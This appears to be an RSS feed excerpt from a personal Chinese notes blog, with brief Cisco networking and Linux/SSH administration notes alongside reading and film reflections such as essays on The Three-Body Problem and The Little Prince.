      <link>https://note.yxzi.xyz/note/technology/internet/cisco/rip-%E5%8D%8F%E8%AE%AE/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/rip-%E5%8D%8F%E8%AE%AE/</guid>
      <description>Rip 协议 RIP 协议是比较老的一款动态路由协议，这款协议现在用的已经很少了；
RIP 协议在 IPv4 里分成两个版本，目前就 RIPv2 版本来讲的话，其实也有很多问题，
比如
 根据路由器或者三层转发设备的条数来判断路径优劣这种判断机制是不准确的。 最大条数只有 15 跳也限制了 RIP 的网络规模。 RIP 运行的速度比较慢，而且可能产生环路对网络有很大的影响。  router rip 启用 Rip
version 2 切换到 RipV2 版本
network 通告该路由器的所有直连网络，通告之后，
该路由器的路由表就会显示除了通告外的所有网络的路由表的本地接口和远程网络的数量是一样的.
show ip protocol 显示该路由器的路由协议，路由表前面的大写字母叫做路由来源
no auto-summary 禁用该路由器上的自动汇总
passive-interface g0/1 将连接局域网的接口 g 0/1 配置为被动接口，
default-information originate 配置路由器的完全指定默认路由的默认信息来源</description>
    </item>
    
    <item>
      <title>Cisco SSH 取代 Telnet</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/ssh-%E5%8F%96%E4%BB%A3-telnet/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/ssh-%E5%8F%96%E4%BB%A3-telnet/</guid>
      <description>SSH 取代 Telnet 远程登录 进入 PC 的 Desktop，选择 Command Prompt，
输入密码并登录。
保护密码
进入特权模式，保存
加密密码 在全局模式下：
Serverce password-encryption SSH 加密通信 ip domian-name usernameip ssh version 2crypto key generate rsa </description>
    </item>
    
    <item>
      <title>Cisco 琐碎知识点</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E7%90%90%E7%A2%8E%E7%9F%A5%E8%AF%86%E7%82%B9/</guid>
      <description>琐碎知识点 C 直连网络
L 本地接口
S 静态路由
汇总路由的作用 将多条路由汇总为一条，减少路由表体积
浮动静态路由的作用 配置静态路由的同时，再后面手动配置一个默认的管理距离
默认静态路由的 ipv4 地址 0.0.0.0 0.0.0.0
ACL 是控制列表
控制列表最后一条是默认拒绝语句
ACL 的两种类型 标准 ACL ，扩展类型 ACL
通配符掩码中的 0 是全匹配 1 是全忽略
通配符掩码是 子网反掩码
host 表示 0.0.0.0
静态路由 目标地址 送出接口或吓一跳
递归静态路由（吓一跳静态路由）
完全指定路由（接口和下一跳都配置）
子网掩码 24 可以包含多少个网络位
网络位 只有八位
全 0 为 网络地址
全 1 为广播地址
rip 动态协议
汇总路由
进站 in
出站 out
三个接口
每个接口有都有一个 in 或 out
一共可以写 6 个 ACL
每个 in 和每个 out 都可以写 ipv4 或 ipv6 的地址</description>
    </item>
    
    <item>
      <title>Cisco 配置中继</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%BB%A7/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%BB%A7/</guid>
      <description>配置中继 进交换机的全局
interface f 0/1 switchport mode trunk switchport trunk native vlan 99 </description>
    </item>
    
    <item>
      <title>Cisco 配置交换机端口安全</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AB%AF%E5%8F%A3%E5%AE%89%E5%85%A8/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%AB%AF%E5%8F%A3%E5%AE%89%E5%85%A8/</guid>
      <description>配置交换机端口安全 配置 S1
enable configure terminal 配置端口模式 interface f 0/1 switchport mode access 打开端口的安全模式 switch port-security //开启f0/1端口的安全功能 switchport port-security maximum 1 // 配置该端口的最大连接数为 1（最大能配置为128 switch） switchport port-security mac-address sticky // 让交换机口主动记下最先插入设备的 MAC 地址。 switchport port-security violation restrict //针对不合法的MAC地址连接该端口，配置端口的处理模式为：（protect[丢弃数据包，不发警告] | restrict[丢弃数据包，在 console 发警告] | shutdown[关]） no shutdown 、 exit </description>
    </item>
    
    <item>
      <title>Cisco 配置单臂路由</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1/</guid>
      <description>配置单臂路由 拓扑图 三台 PC
中间一台交换机
一台路由器在交换机上方
将交换机与路由器连起来
配置 S1 进全局模式 enable configure terminal hostname S1  vlan 10 exit  vlan 20 exit  vlan 30 exit 将指定 access 端口分配给指定 vlan interface f 0/2switchport acces vlan 10exitinterface f 0/3switchport acces vlan 20exitinterface f 0/4switchport acces vlan 30exi 将二层端口配置成 trunk 模式 interface g 0/1switchport mode trunk 配置 R1 enableconfigure terminalhostname R1 配置虚拟子端口 interface g 0/0.</description>
    </item>
    
    <item>
      <title>Hugo 命令</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hugo/%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hugo/%E5%91%BD%E4%BB%A4/</guid>
      <description>Hugo 命令 hugo new site MyBlog 创建一个新的站点文件夹
hugo new Article/first.md hugo -t ThemeName hugo -D 构建静态页面</description>
    </item>
    
    <item>
      <title>SHH 密钥登录</title>
      <link>https://note.yxzi.xyz/note/technology/linux/shh-%E5%AF%86%E9%92%A5%E7%99%BB%E9%99%86/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/linux/shh-%E5%AF%86%E9%92%A5%E7%99%BB%E9%99%86/</guid>
      <description>SHH 密钥登录 用 xshell 生成密钥 新建用户密钥生成向导
输入密钥长度，比如 2024，下一步
输入密钥名称、密码，下一步
将公钥保存为文件，完成
将公钥上传到服务器 我这里用的服务器是 Linux，以及宝塔面板。
进入服务器的**/root/.ssh路径，在这个文件夹中新建authorized_keys文件，并将之前保存的公钥中的文件内容复制到新建的authorized_keys**文件中。
配置 sshd_config 找到服务器下的**/etc/ssh/sshd_config**，点击编辑。
核对文件中的内容是否与一下内容一致，不一致请作出对应的的修改。
注意，一下内容前面的注释符号**#**请删掉。
AuthorizedKeysFile .ssh/authorized_keys PasswordAuthentication no </description>
    </item>
    
    <item>
      <title>Vs Code 使用 Git</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E4%BD%BF%E7%94%A8-git/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E4%BD%BF%E7%94%A8-git/</guid>
      <description>使用 Git 注意本地密钥是否和远程的密钥一样。</description>
    </item>
    
    <item>
      <title>Vs Code 扩展</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E6%89%A9%E5%B1%95/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/vscode/%E6%89%A9%E5%B1%95/</guid>
      <description>Vs Code 扩展 Bracket Pair Colorizer 给匹配的括号着色
Path Intellisense 自动完成文件名
Material Icon Theme 好看的文件图标
Prettier - Code formatter 更优雅的代码格式化。vscode 里比较优秀的一个格式化插件。
VS Code Counter 统计代码总行数、注释行数、空白行数，以及使用的语言。
使用方法：右键需要统计的文件夹—Count lines in directory
Power Mode 一款超级炫酷的编辑代码的插
HTML Snippets 非常实用的 HTML 代码片段以及提示
Atuo Rename Tag 修改 html 标签，自动帮你完成尾部闭合标签的同步修改
Code Runner 能够运行多种语言的代码片段或代码文件：JavaScript，C，C ++，Java，PHP，Python，Perl，Ruby，Go 等等
Easy LESS 保存style.less后，会自动生成style.css到当前路径
px to rem &amp;amp; rpx 实现 px 和 rem 单位之间转换，并支持 WXSS。
Markdown Preview Mermaid Support markdown 支持思维导图
Vetur vue 补全</description>
    </item>
    
    <item>
      <title>WinSCP SSH 密钥登录</title>
      <link>https://note.yxzi.xyz/note/technology/linux/%E7%94%A8%E6%88%B7/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/linux/%E7%94%A8%E6%88%B7/</guid>
      <description>用户 linux 的用户保存在 /etc/passwd 中
这个文件的内容非常规律，每行代表一个用户。大家可能会比较惊讶，Linux 系统中默认怎么会有这么多的用户啊！这些用户中的绝大多数是系统或服务正常运行所必需的用户，我们把这种用户称为系统用户或伪用户。系统用户是不能登录系统的，但是这些用户同样也不能被删除，因为一旦删除，依赖这些用户运行的服务或程序就不能正常执行，会导致系统问题。
现在我们就把 root 用户这一行拿出来，具体分析这个文件中的内容具体代表的含义。可以注意到，这个文件用&amp;quot;:&amp;ldquo;作为分隔符，划分为 7 个字段，我们逐个来看具体的含义。 （1）用户名称 第一个字段中保存的是用户名称。不过大家需要注意，用户名称只是为了方便管理员记忆，Linux 系统是通过用户 ID (UID) 来区分不同用户、分配用户权限的。而用户名称和 UID 的对应正是通过 /etc/passwd 这个文件来定义的。
（2）密码标志 这里的&amp;quot;x&amp;quot;代表的是密码标志，而不是真正的密码，真正的密码是保存在 /etc/shadow 文件中的。在早期的 UNIX 中，这里保存的就是真正的加密密码串，但是这个文件的权限是 644，查询命令如下： [root@localhost ~]# ll /etc/passwd -rw-r–r&amp;ndash; 1 root root 1648 12月29 00:17 /etc/passwd
所有用户都可以读取 /etc/passwd 文件，这样非常容易导致密码的泄露。虽然密码是加密的，但是采用暴力破解的方式也是能够进行破解的。所以现在的 Linux 系统把真正的加密密码串放置在影子文件/etc/shadow中，而影子文件的权限是 000，查询命令如下： [root@localhost ~]# ll /etc/shadow &amp;mdash;&amp;mdash;&amp;mdash;- 1 root root 1028 12月29 00:18 /etc/shadow
这个文件是没有任何权限的，但因为我是 root 用户，所以读取权限不受限制。当然，用强制修改的方法也是可以手工修改这个文件的内容的。只有 root 用户可以浏览和操作这个文件，这样就最大限度地保证了密码的安全。
所以在 /etc/passwd 中只有一个&amp;quot;x&amp;quot;代表用户是拥有密码的，我们把这个字段称作密码标志，具体的密码要去 /etc/shadow 文件中查询。但是这个密码标志&amp;quot;x&amp;quot;也是不能被删除的，如果删除了密码标志&amp;quot;x&amp;rdquo;，那么系统会认为这个用户没有密码，从而导致只输入用户名而不用输入密码就可以登陆（当然只能在使用无密码登录，远程是不可以的），除非特殊情况（如破解用户密码），这当然是不可行的。
（3）UID 第三个字段就是用户 ID(UID)，我们已经知道系统是通过 UID 来识别不同的用户和分配用户权限的。这些 UID 是有使用限制和要求的： 0：超级用户 UID。如果用户 UID 为 0，则代表这个账号是管理员账号。在 Linux 中如何把普通用户升级成管理员呢？只需把其他用户的 UID 修改为 0 就可以了，这一点和 Windows 是不同的。不过不建议建立多个管理员账号。 1~499：系统用户（伪用户）UID。这些 UID 是系统保留给系统用户的 UID，也就是说 UID 是 1~499 范围内的用户是不能登录系统的，而是用来运行系统或服务的。其中，1~99 是系统保留的账号，系统自动创建；100~499 是预留给用户创建账号的。 500~65535：普通用户 UID。建立的普通用户 UID 从 500 开始，最大到 65535。</description>
    </item>
    
    <item>
      <title>《三体·地球往事》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/novel/%E4%B8%89%E4%BD%93%E5%9C%B0%E7%90%83%E5%BE%80%E4%BA%8B/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/novel/%E4%B8%89%E4%BD%93%E5%9C%B0%E7%90%83%E5%BE%80%E4%BA%8B/</guid>
      <description>《三体·地球往事》 我的第一本科幻书 《三体·地球往事》是我看的第一本科幻类型的书，说句实话，我第一次看三体第一部的时候，感觉这玩意很难看懂，深奥的物理知识，为数不多的科幻描写，真给我整懵逼了，让我不得不怀疑这本获得了雨果奖的科幻神作，但时间一转，我终于在今年初将三部曲看完了，这一次的阅读，不知是不是我三本连起来读的原因，在阅读的过程中无比感叹作者知识的宽广与深度，以及无与伦比的想象力！
自身想象力的匮乏 在这之前，我也对宇宙有着幻想，也会独自走到楼顶，望着深渊般的天空与时而闪烁的群星，我内心颤栗着，不禁幻想着自己能有一双翅膀，能看看天空真实的模样，想想就令人十分兴奋！虽然我不知道宇宙是什么样的，是否有外星人，我们是否是宇宙中唯一的人类，但幸运的是，《三体·地球往事》带我走进了这个复杂而又奇妙的世界！复杂的是那些对我而言深奥复杂的物理知识，正儿八经，这里差点把我劝退》…奇妙的是原来宇宙还能这样！
读这本书的过程中，我感到我的想象力是如此匮乏与空虚，空有想象力，但却无法形成一个独立世界，无法像书中那样，自成一个符合逻辑与科学的世界，但又丝毫不缺乏一种超前与震撼的感觉。
汪淼是主角的错觉 刚开始读的时候，我原以为汪淼就是书中的主角，但读到后面愈发觉得，这人怕只是一个移动摄像机，具体点说，像一个旁观者，故事中大部分场景都是以他的视角来描写的，像是作者故意安排这个人来带我们了解这个三体世界，了解三体游戏。
叶文洁的登场 其次是主角叶文洁，讲道理，读到这里的时候，我根本不会想到主角会是一个老太太，但读到红岸基地时候的故事的故事之后，我知道了，我小巧了这个弱不禁风的老太太，特别是当叶文洁按下发射器的那一刻，我的灵魂似乎已经来到了红岸基地，静静的看着叶文洁按下发射器，看着这改变人类未来的一幕，也让我感受到了叶文洁对人类的绝对失望，在这之前，他的父亲在文革时期被活生生的被皮带抽死在批斗台上，她自己在台下目睹了这一切，我想，在那一刻，她一定无比憎恨人类，而在这之后，她通过白沐霖接触到禁书《寂静的春天》中的环保理念后，他对白沐霖产生了好感，因为他让她再次相信这个世界还是有善良的人的，但就是这个在黑暗中带给她一丝光明的白沐霖，将她推入了万丈深渊，让她成为了一个替罪羔羊，最后就是发现对她一向非常好的领导雷志成，也只是想占有了她的研究成果图谋上位后，她彻底失望了，我想，这也是她为什么会按下发射按钮的原因，她坚信，只有这个远高于地球文明的三体文明才能解决现在人类解决不了的问题。
叶文洁的决断 在这之后，她为了保守这个秘密，不惜杀害这个从监狱里救出她的恩人和深爱她的丈夫，看到这里我也非常佩服叶文洁的决断，愈发觉得她对整个人类世界的失望是无法用语言形容的，她希望借三体世界这个高级文明的力量来拯救这个腐败的人类的世界，她在这方便似乎已经陷入了魔怔，为此还间接导致数位顶级科学家，也就是书中开头的所说的数位科学家的大佬离奇死亡，甚至其中还包括她的女儿，我不由的感叹，这何尝不是一种疯狂，一种狠辣，不由让我感叹这些手段，是一个女人能做出来的吗。也许叶文洁从她父亲死亡的那一刻起，就已经是另外一个人了。
诡异而又神秘的游戏 接着就是三体游戏，刚开始，我很疑惑，一个现时中的科幻书啥要扯上游戏，而且这个游戏还用很多我们国家古代的人名，比如：秦始皇、爱因斯坦、墨子、冯诺依曼等等，我就更加疑惑了，咋滴，一个科幻小说，还回顾一下世界历史吗，结果读到后面我发现我错了，而且错的离谱。
这个游戏是以叶文洁为首的三体组织所建立的，这也很让我意外，这个似乎弱不禁风的女子，居然是这个组织的建立者，我再次发现我低估了这个改变人类命运的女人。
这个三体游戏，也是这个组织建立的，这也很合理，毕竟这个组织可是世界各地顶尖的科学家所设立的，都是高端人士啊。看到这里我也不禁在心中说出两个字，牛逼啊！别的组织都是 i 从低端人才开始招揽，你们居然直接从科学家开始&amp;hellip;
后来我也很疑惑为什么三体组织要开发这个游戏，毕竟凡事都是有目的的。这个看似无害的游戏也并非看起来的那么友善。后来我逐渐发现，这个游戏非常有可能是为了让更多的人了解三体这个世界而开发的，也就是说三体组织想让地球上更多的人了解三体世界，接纳三体世界。
这似乎也暴露了一个惊人的结论：三体组织与三体世界互相联系过！
end</description>
    </item>
    
    <item>
      <title>《三体·死神永生》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/novel/%E4%B8%89%E4%BD%93%E6%AD%BB%E7%A5%9E%E6%B0%B8%E7%94%9F/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/novel/%E4%B8%89%E4%BD%93%E6%AD%BB%E7%A5%9E%E6%B0%B8%E7%94%9F/</guid>
      <description>《三体·死神永生》 </description>
    </item>
    
    <item>
      <title>《三体·黑暗森林》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/novel/%E4%B8%89%E4%BD%93%E9%BB%91%E6%9A%97%E6%A3%AE%E6%9E%97/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/novel/%E4%B8%89%E4%BD%93%E9%BB%91%E6%9A%97%E6%A3%AE%E6%9E%97/</guid>
      <description>《三体·黑暗森林》 </description>
    </item>
    
    <item>
      <title>《人体内旅行》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E4%BA%BA%E4%BD%93%E5%86%85%E6%97%85%E8%A1%8C/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E4%BA%BA%E4%BD%93%E5%86%85%E6%97%85%E8%A1%8C/</guid>
      <description>《人体内旅行》 第一次看《人体内旅行》这部纪录片。
看完后，很是让我感受到了人体的精密，得天独厚的同时，但又不堪一击。
不得不使我开始思考一个问题——我明明有着如此神秘且奇妙的人体结构，为什么我还是如此的平凡且普通？
亦或者是我没有发现我的独特之处？
还是像我这样拥有神秘人体结构的人太多了？
我发现，这个时代似乎很少人珍惜自己的身体健康，似乎这样说也不准确，而应该说，
珍惜身体健康的人越来越珍惜，不珍惜的人越来越不珍惜。
这种两级分化的现象很让我不解，但又似乎不可避免。
是因为内心不重视吗？但我想没人会不重视自己的身体吧。
或者只是因为这该死的生活压力，无法让人抽出空闲时间来思考这些问题罢。</description>
    </item>
    
    <item>
      <title>《元尊》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/fantasy/%E5%85%83%E5%B0%8A/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/fantasy/%E5%85%83%E5%B0%8A/</guid>
      <description>《元尊》 </description>
    </item>
    
    <item>
      <title>《地球脉动》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E5%9C%B0%E7%90%83%E8%84%89%E5%8A%A8/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E5%9C%B0%E7%90%83%E8%84%89%E5%8A%A8/</guid>
      <description>《地球脉动》 </description>
    </item>
    
    <item>
      <title>《夜行者》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E5%A4%9C%E8%A1%8C%E8%80%85/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E5%A4%9C%E8%A1%8C%E8%80%85/</guid>
      <description>《夜行者》 </description>
    </item>
    
    <item>
      <title>《宇宙时空之旅》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E5%AE%87%E5%AE%99%E6%97%B6%E7%A9%BA%E4%B9%8B%E6%97%85/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E5%AE%87%E5%AE%99%E6%97%B6%E7%A9%BA%E4%B9%8B%E6%97%85/</guid>
      <description>《宇宙时空之旅》 </description>
    </item>
    
    <item>
      <title>《小王子》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/novel/%E5%B0%8F%E7%8E%8B%E5%AD%90/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/novel/%E5%B0%8F%E7%8E%8B%E5%AD%90/</guid>
      <description>《小王子》 玫瑰和狐狸对小王子的感情分别是怎样的？ 我的回答是，玫瑰和狐狸对小王子都是爱。
但是他们爱的方式和成熟度是有很大差别的。
玫瑰的爱是青涩的，甚至有点小女人有点作的。
狐狸的爱是成熟的，包容的，付出的，让小王子成长的。
为什么这么说捏，下面来解释一下。
写玫瑰时已经用了大量的铺垫，然而玫瑰的出场却不免让让人有点失望。
 她已经精细地做了那么长的准备工作，却打着哈欠说道：
“我刚刚睡醒，真对不起，瞧我的头发还是乱蓬蓬的……”
小王子这时再也控制不住自己的爱慕心情： “你是多么美丽啊！”
花儿悠然自得地说：
“是吧，我是与太阳同时出生的……”
小王子看出了这花儿不太谦虚，可是她确实丽姿动人。
 玫瑰一开花说的第一句话就有些故作姿态，暗示引导小王子去注意她赞美她。虽然识破了玫瑰的故意并不能阻止小王子对玫瑰的爱慕，但玫瑰却因此给小王子留下了骄傲虚荣的印象。
其实这里我们已经能看出来玫瑰的青涩，但她的骄傲爱面子只会让她的爱变得更加稚嫩。
再看小王子走时玫瑰的独白。
 花儿咳嗽了一阵。但并不是由于感冒。
她终于对他说道：“我方才真蠢。请你原谅我。希望你能幸福。” 花儿对他毫不抱怨，他感到很惊讶。他举着罩子，不知所措地伫立在那里。 他不明白她为什么会这样温柔恬静。
“的确，我爱你。”花儿对他说道：“但由于我的过错，你一点也没有理会。 这丝毫不重要。不过，你也和我一样的蠢。希望你今后能幸福。把罩子放在一边吧，我用不着它了。”
“要是风来了怎么办？”
“我的感冒并不那么重……夜晚的风对我有益。”
“要是有虫子野兽呢？……”
“我要是想认识蝴蝶，经不起两三只毛毛虫是不行的。据说这是很美的。不然还有谁来看我呢？你就要到远处去了。至于说大动物，我并不怕，我有爪子。”
于是，她天真地显露出她那四根刺，随后又说道： “别这么磨蹭了。真烦人！你既然决定离开这儿，那么，快走吧！”
她是怕小王子看见她在哭。她是一朵非常骄傲的花……
 她一开花便要他为她浇水，装咳嗽，晚上还要罩子，其实连她自己都知道她根本不需要至如此，而这一切全都是——爱的试炼。她让他为她服务，反复考验，并享受这种状态。
这简直是现实生活中的缩影，我认识的很多敏感又有点小虚荣的女孩都会这样对自己爱的人，不是不爱，不爱就不会折磨对方了，只是太青涩，完全不懂的如何去表达爱。
其实玫瑰是懂事的，小王子疲惫了要走到更远的地方开拓视野，玫瑰没有哭闹，只是简单地祝他幸福并且叫他放心走不要挂念她，玫瑰的懂事叫人心疼。
而“她是一朵非常骄傲的花”这句无论是评价还是独白，我的理解是这是玫瑰对自己的一种掩饰。她怕小王子看见她哭是因为，她怕他看到就会看穿她的敏感脆弱，进而选择不去别的地方闯荡而束缚捆绑了他，亦或者她更怕即便他看到她流泪也还是执意离开。
她很青涩很敏感，让人不禁心生怜悯变得温柔起来。
————————————————————————————————————
而狐狸呢。
小王子去了很多星球，终于来到了地球，在意识到自己星球的玫瑰并不是独一无二时遇见并驯养了狐狸，在小王子离开的时候，狐狸非常难过，但仍然悉心告诉小王子自己的秘密，他的的最后一句叮嘱是：
 “再见。”狐狸说。“喏，这就是我的秘密。很简单：只有用心才能看得清。 实质性的东西，用眼睛是看不见的。”
“实质性的东西，用眼睛是看不见的。”小王子重复着这句话，以便能把它 记在心间。
“正因为你为你的玫瑰花费了时间，这才使你的玫瑰变得如此重要。”
“正因为你为你的玫瑰花费了时间……”小王子又重复着，要使自己记住这些。
“人们已经忘记了这个道理，”狐狸说，“可是，你不应该忘记它。你现在要对你驯服过的一切负责到底。你要对你的玫瑰负责……”
“我要对我的玫瑰负责……”小王子又重复着……
 狐狸知道并且厌烦了在猎人过节日时去偷鸡，他已经谙熟了这个世界的生存法则。而这个世界的法则跟小王子的世界是完全不一样的，小王子的星球的生存法则就是纪律性的——分辨并拔掉猴面包树的苗，定期清理火山。小王子的世界因为有定数，所以单纯简单，他们两个注定无法在一个世界。 所以狐狸一出场就以一个成熟老练甚至狡黠的身份出现，这也注定了他感情上的成熟和智者身份的教诲。
在狐狸执意要小王子驯养他之前，他就知道这段感情注定是一场空。
其实驯养不一定意味着就会喜欢就会爱，驯养的本质是一种习惯，一种填补。 但狐狸爱上了他。因为即便在分别的时候如此难过，狐狸也不忘叮嘱小王子要对玫瑰负责。让自己爱的人对他爱的人负责，是怎样的心情，怎样的心胸呢，要多么深沉的爱才可以认真说出这种话呢。小王子在玫瑰那里受的伤，狐狸来安抚，小王子对玫瑰的责任，狐狸来教，狐狸阿狐狸，你怎么偏偏爱上了如此单纯的小王子。
你教导小王子要对他所驯养的一切负责，这其中是不是，也包括你自己呢？如果不包括，又是怎样的一种牺牲阿。
但在小王子走后，至少狐狸不会那么寂寞，因为狐狸从此爱上风吹麦浪的声音，心中有了想念的人。无牵无挂心中空空如也才最是寂寞。
你走，我不送你。你来，无论多大风多大雨，我要去接你。 ——梁实秋
你要走便走，我不会留。</description>
    </item>
    
    <item>
      <title>《弱点》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E5%BC%B1%E7%82%B9/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E5%BC%B1%E7%82%B9/</guid>
      <description>《弱点》 </description>
    </item>
    
    <item>
      <title>《徒手攀岩》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E5%BE%92%E6%89%8B%E6%94%80%E5%B2%A9/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/documentary/%E5%BE%92%E6%89%8B%E6%94%80%E5%B2%A9/</guid>
      <description>《徒手攀岩》 </description>
    </item>
    
    <item>
      <title>《我不是药神》</title>
      <link>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%88%91%E4%B8%8D%E6%98%AF%E8%8D%AF%E7%A5%9E/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/movie/film/%E6%88%91%E4%B8%8D%E6%98%AF%E8%8D%AF%E7%A5%9E/</guid>
      <description>《我不是药神》 </description>
    </item>
    
    <item>
      <title>《我害怕阅读的人》</title>
      <link>https://note.yxzi.xyz/note/afterthought/book/essay/%E6%88%91%E5%AE%B3%E6%80%95%E9%98%85%E8%AF%BB%E7%9A%84%E4%BA%BA/</link>
      <pubDate>Fri, 22 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/afterthought/book/essay/%E6%88%91%E5%AE%B3%E6%80%95%E9%98%85%E8%AF%BB%E7%9A%84%E4%BA%BA/</guid>
      <description>《我害怕阅读的人》 原文 不知何时开始，我害怕阅读的人。
就像我们不知道冬天从哪天开始，只会感觉夜的黑越来越漫长。
我害怕阅读的人。一跟他们谈话，我就像一个透明的人，苍白的脑袋无法隐藏。
我所拥有的内涵是什么？不就是人人能脱口而出，游荡在空气中最通俗的认知吗？
像心脏在身体的左边。春天之后是夏天。美国总统是世界上最有权力的人。
但阅读的人在知识里遨游，能从食谱论及管理学，八卦周刊讲到社会趋势，
甚至空中跃下的猫，都能让他们对建筑防震理论侃侃而谈。
相较之下，我只是一台在 MP3 世代的录音机；
过气、无法调整。我最引以为傲的论述，恐怕只是他多年前书架上某本书里的某段文字，
而且，还是不被荧光笔画线注记的那一段。
我害怕阅读的人。
当他们阅读时，脸就藏匿在书后面。
书一放下，就以贵族王者的形象在我面前闪耀，举手投足都是自在风采。
让我明了，阅读不只是知识，更是魔力。
他们是懂美学的牛顿。懂人类学的梵谷。懂孙子兵法的甘地。
血液里充满答案，越来越少的问题能让他们恐惧。
彷佛站在巨人的肩牓上，习惯俯视一切。
那自信从容，是这世上最好看的一张脸。
我害怕阅读的人。
因为他们很幸运；当众人拥抱孤独、或被寂寞拥抱时，
他们的生命却毫不封闭，不缺乏朋友的忠实、不缺少安慰者的温柔，甚至连互相较劲的对手，都不会匮乏。
他们一翻开书，有时会因心有灵犀，而大声赞叹，
有时又会因立场不同而陷入激辨，有时会获得劝导或慰藉。
这一切毫无保留，又不带条件，是带亲情的爱情，是热恋中的友谊。
一本一本的书，就像一节节的脊椎，稳稳的支持着阅读的人。
你看，书一打开，就成为一个拥抱的姿式。
这一切，不正是我们毕生苦苦找寻的？
我害怕阅读的人。
他们总是不知足。
有人说，女人学会阅读，世界上才冒出妇女问题，也因为她们开始有了问题，女人更加读书。
就连爱因斯坦；这个世界上智者中的最聪明者，临终前都曾说：
我看我自己，就像一个在海边玩耍的孩子，找到一块光滑的小石头，就觉得开心。
后来我才知道自己面对的，还有一片真理的大海，那没有尽头
读书人总是低头看书，忙着浇灌自己的饥渴，他们让自己是敞开的桶子，随时准备装入更多、更多、更多。
而我呢？手中抓住小石头，只为了无聊地打水漂而已。
我害怕阅读的人。
我祈祷他们永远不知道我的不安，免得他们会更轻易击垮我，甚至连打败我的意愿都没有。
